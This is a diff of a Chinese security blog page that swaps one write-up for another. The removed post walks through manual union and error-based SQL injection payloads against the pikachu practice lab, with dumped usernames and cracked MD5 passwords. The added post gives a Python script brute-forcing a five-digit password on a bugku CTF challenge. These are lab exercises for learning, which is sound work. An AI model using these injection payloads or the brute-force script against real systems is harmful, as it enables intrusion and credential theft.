@@ -22,7 +22,7 @@
 
   
 
-  <title>pikachu靶场-SQLI-数字型注入（POST） | Liv_binz的技术博客</title>
+  <title>bugku1 py爆破初尝试 | Liv_binz的技术博客</title>
 
   
 
@@ -90,20 +90,20 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">pikachu靶场-SQLI-数字型注入（POST）</h1>
+          <h1 class="title-wrap">bugku1 py爆破初尝试</h1>
           <h2 class="title-sub-wrap">
             <strong>b1nz</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-01-31T05:24:30.628Z" itemprop="datePublished">2022-01-31</time>
+            <time  class="article-date" datetime="2022-05-07T17:05:21.339Z" itemprop="datePublished">2022-05-08</time>
           </h2>
           <ul class="wrap-list dark">
   
-    <li><a href="/categories/sqli/">📒 sqli</a></li>
+    <li><a href="/categories/wp/">📒 wp</a></li>
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/pikachu/">🏷️ pikachu</a></li>
+    <li><a href="/tags/bugku/">🏷️ bugku</a></li>
   
 </ul>
         </div>
@@ -127,138 +127,57 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="pikachu靶场-SQLI-数字型注入（POST）"><a href="#pikachu靶场-SQLI-数字型注入（POST）" class="headerlink" title="pikachu靶场-SQLI-数字型注入（POST）"></a>pikachu靶场-SQLI-数字型注入（POST）</h1><ol>
-<li>请求方式— <strong>POST</strong></li>
-<li>包裹方式— <strong>id=1</strong></li>
-<li>注入类型— <strong>联合、报错、布尔盲注、延时</strong></li>
-</ol>
-<p>下面演示一下联合注入和报错注入by hand</p>
-<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>首先查列：</p>
-<pre><code>id=1 order by 1#&amp;submit=%E6%9F%A5%E8%AF%A2
+        <h1 id="bugku1-py爆破初尝试"><a href="#bugku1-py爆破初尝试" class="headerlink" title="bugku1 py爆破初尝试"></a>bugku1 py爆破初尝试</h1><blockquote>
+<p>B1nz碎碎念 太久不干活的后果就是连自己设置的快捷键都忘光光 </p>
+</blockquote>
+<blockquote>
+<p>参考资料：</p>
+</blockquote>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://docs.python-requests.org/zh_CN/latest/user/quickstart.html">https://docs.python-requests.org/zh_CN/latest/user/quickstart.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51641607/article/details/115754083">https://blog.csdn.net/m0_51641607/article/details/115754083</a></p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220508011420.png"></p>
+<p>这道题点进去看到是这样的</p>
+<p>简单粗暴的爆破题目</p>
+<p>但是here’s the problem</p>
+<p>一杯茶一根烟，bp一开爆一天</p>
+<p>借此契机来试试看写个py脚本来爆破吧~</p>
+<p>先抓个包看看：</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/1651944173(1).png"></p>
+<p>ok啦开始写脚本：</p>
+<p>这里学习到了一个新函数叫：</p>
+<pre><code>str.zfill()
 </code></pre>
-<p>回显正常</p>
-<pre><code>id=1 order by 2#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显正常</p>
-<pre><code>id=1 order by 3#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>Unknown column &#39;3&#39; in &#39;order clause&#39;
-</code></pre>
-<p>列数：2</p>
-<p>查库：</p>
-<pre><code>id=-1 union select 1,database()#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>hello,1
-your email is: pikachu
-</code></pre>
-<p>库名为pikachu</p>
-<p>查表：</p>
-<pre><code>id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;pikachu&#39;#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>hello，1
-your email is: httpinfo,member,message,users,xssblind
-</code></pre>
-<p>表名为httpinfo,member,message,users,xssblind</p>
-<p>查列：</p>
-<pre><code>id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39; #&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>hello，1
-your email is:id,username,password,level
-</code></pre>
-<p>列名为id,username,password,level</p>
-<p>查字段：</p>
-<pre><code>id=-1 union select group_concat(username),group_concat(paswoord) from users#&amp;submit=%E6%9F%A5%E8%AF%A2
+<p>这个</p>
+<p>代码如下：</p>
+<pre><code>import requests
+def bomb():
+    url = &#39;http://114.67.175.224:10583/&#39;
+    for i in range(0,99999):
+        pwd = str(i)
+        pwd = pwd.zfill(5)
+        r = requests.post(url, data=&#123;&#39;pwd&#39;:pwd&#125;)
+        r.encoding = &#39;utf-8&#39;
+        wrong = &quot;密码不正确，请重新输入&quot;
+        if (wrong in r.text):
+            print(&quot;密码：&#123;&#125;,状态码:&#123;&#125;,dammn不是这个&quot;.format(pwd,r.status_code))
+        else:
+            print(&quot;密码：&#123;&#125;,状态码:&#123;&#125;,hooray!!&quot;.format(pwd,r.status_code))
+            print(&quot;结束！辛苦了b1nz&quot;)
+            break
 
-id=-1 union select group_concat(username),group_concat(level) from users#&amp;submit=%E6%9F%A5%E8%AF%A2
+bomb()
 </code></pre>
-<p>回显：</p>
-<pre><code>hello,admin,pikachu,test
-your email is: e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03
-
-hello,admin,pikachu,test
-your email is: 1,2,3
-</code></pre>
-<p>对密码进行md5解密：</p>
+<p>有序运行中~</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220508015641.png"></p>
 <blockquote>
-<p>e10adc3949ba59abbe56e057f20f883e — 123456<br>670b14728ad9902aecba32e22fa4f6bd — 000000<br>e99a18c428cb38d5f260853678922e03 — abc123</p>
+<p>我听了一整张tyga的专都没爆完  疲倦了（香烟）</p>
 </blockquote>
-<p>用户名：</p>
-<p>admin，pikachu，test</p>
-<p>密码：</p>
-<p>123456，000000，abc123</p>
-<p>level：</p>
-<p>1，2，3</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>查库：</p>
-<pre><code>id=-1 and extractvalue(1,concat(0x7e,(select database())))#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~pikachu&#39;
-</code></pre>
-<p>查表：</p>
-<pre><code>id=-1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;pikachu&#39;)))#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code> XPATH syntax error: &#39;~httpinfo,member,message,users,x&#39;
-</code></pre>
-<blockquote>
-<p>报错信息有32字节的限制</p>
-<p>如果显示里没有需要的表名，再用limit来查</p>
-</blockquote>
-<p>查列：</p>
-<pre><code>id=-1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;pikachu&#39; and table_name=&#39;users&#39;)))#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~id,username,password,level&#39;
-</code></pre>
-<p>查字段：</p>
-<pre><code>id=-1 and extractvalue(1,concat(0x7e,(select username from users limit 0,1)))#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~admin&#39;
-</code></pre>
-<p>limit 1，1</p>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~pikachu&#39;
-</code></pre>
-<p>limit 2，1</p>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~test&#39;
-</code></pre>
-<p>limit 3，1</p>
-<p>回显：</p>
-<pre><code>您输入的user id不存在
-</code></pre>
-<p>字段只有3个</p>
-<p>接着查password：</p>
-<pre><code>id=-1 and extractvalue(1,concat(0x7e,(select password from users limit 0,1)))#&amp;submit=%E6%9F%A5%E8%AF%A2
-</code></pre>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~e10adc3949ba59abbe56e057f20f883&#39;
-</code></pre>
-<p>limit 1,1</p>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~670b14728ad9902aecba32e22fa4f6b&#39;
-</code></pre>
-<p>limit 2,1</p>
-<p>回显：</p>
-<pre><code>XPATH syntax error: &#39;~e99a18c428cb38d5f260853678922e0&#39;
-</code></pre>
-<p>解码：</p>
-<p>对密码进行md5解密：</p>
-<blockquote>
-<p>e10adc3949ba59abbe56e057f20f883e — 123456<br>670b14728ad9902aecba32e22fa4f6bd — 000000<br>e99a18c428cb38d5f260853678922e03 — abc123</p>
-</blockquote>
-<p>用户名：</p>
-<p>admin，pikachu，test</p>
-<p>密码：</p>
-<p>123456，000000，abc123</p>
-<blockquote>
-<p>如果对level字段有需求可以接着查，和查username和password字段的步骤一样^^</p>
-</blockquote>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220508020900.png"></p>
+<p>o可o可</p>
+<p>输入得到flag</p>
+<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220508021024.png"></p>
+<p>今天也成功掉发了呢！散会！</p>
 
       </section>
 
@@ -266,22 +185,6 @@ your email is: 1,2,3
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-      <div class="card-cover" background-image-lazy data-img="/cover.jpg"></div>
-    
-    <div class="card-text">
-      
-        <a href="/2022/01/31/pikachu2/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">pikachu靶场-不安全的URL重定向</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
@@ -290,8 +193,8 @@ your email is: 1,2,3
     
     <div class="card-text">
       
-        <a href="/2022/01/28/http1/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">HTTP系列1-HTTP/0.9-HTTP/1.0</h2>
+        <a href="/2022/05/03/xss1/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">见框就插之XSS</h2>
         </a>
       
       <div class="card-text--row">Older</div>
